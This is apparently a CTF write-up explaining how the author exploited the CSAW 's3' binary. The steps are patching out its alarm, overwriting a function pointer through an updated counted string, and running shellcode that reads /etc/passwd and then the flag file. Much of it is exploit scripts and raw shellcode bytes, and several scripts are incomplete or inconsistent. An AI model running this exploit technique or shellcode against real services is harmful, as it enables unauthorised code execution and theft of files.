### Solved by barrebas

A while ago, we threw together a semi-official VulnHub CTF. This team participated in the CSAW CTF. For me, it was a new and _humbling_ experience. I didn't get a lot of flags but I managed to get this one.

Upon downloading the binary called ```s3```, I connected to the remote server to quickly see what I was up against.

```
$ nc 54.165.225.121 5333
```

However, the connection timed out very quickly. I checked out the local copy with file:

```
$ file s3
s3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped
```

Interesting, a 64 bit binary. Viewing it in ```hopper``` suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn't sit well with me, because I could hardly enter the second command to play around.

I fired up ```gdb-peda``` and ran the binary. It quickly showed the problem:

```
gdb-peda$ r

Program received signal SIGALRM, Alarm clock.
```

![s3: gdb caught the alarm.](/images/2014/csaw/s3/s3-gdb-alarm.png)

Turns out this SIGALRM is generated by a call to [alarm()](http://linux.die.net/man/2/alarm). In hindsight, I could have made a library that overrides the call to ```alarm()```, but I went with the hex-editing approach. I disassembled the binary using ```objdump``` and used ```grep``` to search the output for "alarm":

```
$ objdump -d s3 | grep alarm
0000000000401300 <alarm@plt>:
  402126:   e8 d5 f1 ff ff          callq  401300 <alarm@plt>
  403771:   e8 8a db ff ff          callq  401300 <alarm@plt>
```

Using ```xxd```, ```objdump``` and ```sed```, I replaced those bytes with NOPs and reversed the process with ```xxd -r```, generating a new binary in the process that was devoid of annoying timeouts!

The binary allows the storage of two types of strings: NULL-terminated and so-called "counted" strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.

![s3: NULL-terminated strings, no problems!](/images/2014/csaw/s3/s3-NULL-string.png)

Next, the obvious target was the "counted" string. I created a string "bleh", updated it to "blehbleh" and tried to read from it... segfault! Awesome, we have a lead.

![s3: counted strings... Oops!](/images/2014/csaw/s3/s3-countedstring-segfault.png)

Time to fire up ```gdb``` again and try to reproduce the crash:

![s3: success! Let's see what's going on.](/images/2014/csaw/s3/s3-gdb-reproduced-crash.png)

It looks like the updated string somehow overwrites a function pointer. This pointer is used here:

```
=> 0x4019d6:    call   QWORD PTR [rax+0x10]
```

Obviously, ```0x42424242-0x10``` holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack ```EIP``` and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:

![s3: exploitation flow](/images/2014/csaw/s3/strings.png)

We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode... confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:

![s3: memory addresses as string identifiers](/images/2014/csaw/s3/s3-gdb-id-is-address.png)

I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:

```
$ while [[ 1 ]]; do nc -e ./s3 -v -l -p 5333; done
```

Notice that I'm using ```s3``` again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with ```ulimit -c unlimited``` and started scripting and debugging, a lot.

```
#!/usr/bin/python

def getID(data):
    match = re.search(r'(\d.*)$', data.strip())<
    if match:
        return int(match.group(1))

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 5333))

# banner
print s.recv(1024)

# send first string. this will be our shellcode
s.send('c 0 CTF!\n')

p_shellcode = getID(data)

print '[+] first location = 0x{0:08x}'.format(p_shellcode)

# send second string. this will be our 'pivot' pointer.
# let's crash the binary to see if this works
s.send("c 1\n")

data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_tmp = getID(data)

s.send('u ' + str(p_tmp) + ' AAAA\n')

data = s.recv(64)
p_pivot = getID(data)

print '[+] second location = 0x{0:08x}'.format(p_pivot)

# send read request to crash binary

s.send('r ' + str(p_pivot) + '\n')
data = s.recv(64)
s.recv(2)   # receive pesky '> '

# terminate connection cleanly
time.sleep(0.1)
s.send('x\n')

s.close()
```

After running this (and careful debugging of the script) I got a coredump:

```
$ python ./amaz.py

```

Good, we have control over ```rax```. Now let's use this to dereference the pointer to the first string:

```
s.send('u ' + str(p_tmp) + ' ' + struct.pack('>L', p_shellcode-0x10) + '\n')
```

Which obviously still crashes, because now the binary executes:

```
#0  0x0000000021465443 in ?? ()
```

Which obviously contains no data, nor any code. But let's give it a proper pointer, shall we? And while I'm at it, I'll set the shellcode to ```INT3```. The stack is executable, so this should work!

```
#!/usr/bin/python

from socket import *
import time, re, struct


def getID(data):
    match = re.search(r'(\d.*)$', data.strip())
    if match:
        return int(match.group(1))

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 5333))

# banner
print s.recv(1024)

# send first string. this will be our shellcode
s.send('c 0 \xCC\xCC\xCC\xCC\n')
data = s.recv(64)

p_shellcode = getID(data)

print '[+] shellcode = 0x{0:08x}'.format(p_shellcode)


# send second string. this will be our 'pivot' pointer.
s.send('c 0 ' + struct.pack('<L', p_shellcode) + '\n')
data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_pivot = getID(data)

print '[+] pivot = 0x{0:08x}'.format(p_pivot)

# let's crash the binary to see if this works
s.send("c 1\n")

data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_tmp = getID(data)

s.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\n')

data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_vuln = getID(data)

print '[+] vulnerable pointer = 0x{0:08x}'.format(p_vuln)

# send read request to crash binary
s.send('r ' + str(p_vuln) + '\n')
data = s.recv(64)
s.recv(2)   # receive pesky '> '

# terminate connection cleanly
time.sleep(0.1)
s.send('x\n')

s.close()
```

In the other terminal, I observed:

```
connect to [127.0.0.1] from localhost [127.0.0.1] 53500
Trace/breakpoint trap (core dumped)
listening on [any] 5333 ...
```

BOOM! Code execution on my local machine!

At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon [this one!](http://shell-storm.org/shellcode/files/shellcode-878.php).

I stuck it in the exploit and lo and behold:

```
#!/usr/bin/python

from socket import *

def getID(data):
    match = re.search(r'(\d.*)$', data.strip())
    if match:
        return int(match.group(1))

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 5333))

# banner

# send first string. this will be our shellcode
s.send('c 0 \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n')

data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_shellcode = getID(data)

print '[+] shellcode = 0x{0:08x}'.format(p_shellcode)


# send second string. this will be our 'pivot' pointer.
s.send('c 0 ' + struct.pack('<L', p_shellcode) + '\n')
data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_pivot = getID(data)

print '[+] pivot = 0x{0:08x}'.format(p_pivot)

# let's crash the binary to see if this works
s.send("c 1\n")

data = s.recv(64)
s.recv(2)   # receive pesky '> '
p_tmp = getID(data)

s.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\n')

s.send('r ' + str(p_vuln) + '\n')

print s.recv(1000)

time.sleep(0.1)
s.send('x\n')

s.close()
```

```

This also worked against the remote server! It showed me that there was a user called ```amazon``` with home directory ```/home/amazon```. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:

```
; NULL byte fix
xor byte [rdi + 11], 0x41
```

We need to update the value 11, or ```0x0b```. The exploit code was modified once more, spraying ```time.sleep()``` calls here and there:

```
#!/usr/bin/python

from socket import *
import time, re, struct, sys


def getID(data):
    match = re.search(r'(\d.*)', data.strip())
    if match:
        return int(match.group(1))

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 5333))

# banner
s.recv(1024)

length = len(sys.argv[1])
filename = sys.argv[1].strip()
# send first string. this will be our shellcode

time.sleep(0.1)
#s.recv(2)  # receive pesky '> '
data = s.recv(64)
p_shellcode = getID(data)

print '[+] shellcode = 0x{0:08x}'.format(p_shellcode)

# send second string. this will be our 'pivot' pointer.
s.send('c 0 ' + struct.pack('<L', p_shellcode) + '\n')

time.sleep(0.1)
data = s.recv(64)
p_pivot = getID(data)

print '[+] pivot = 0x{0:08x}'.format(p_pivot)

# let's crash the binary to see if this works
s.send("c 1\n")

time.sleep(0.1)
data = s.recv(64)
p_tmp = getID(data)

s.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\n')

time.sleep(0.1)
data = s.recv(64)
p_vuln = getID(data)

print '[+] vulnerable pointer = 0x{0:08x}'.format(p_vuln)

# send read request to crash binary
s.send('r ' + str(p_vuln) + '\n')

time.sleep(0.1)
print s.recv(1024)

# terminate connection cleanly
time.sleep(0.1)
s.send('x\n')

s.close()
```

(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).

Now it was a matter of getting the flag. I tried ```/home/amazon/key```, which returned nothing. Next was ```/home/amazon/flag``` and that was a bingo :)
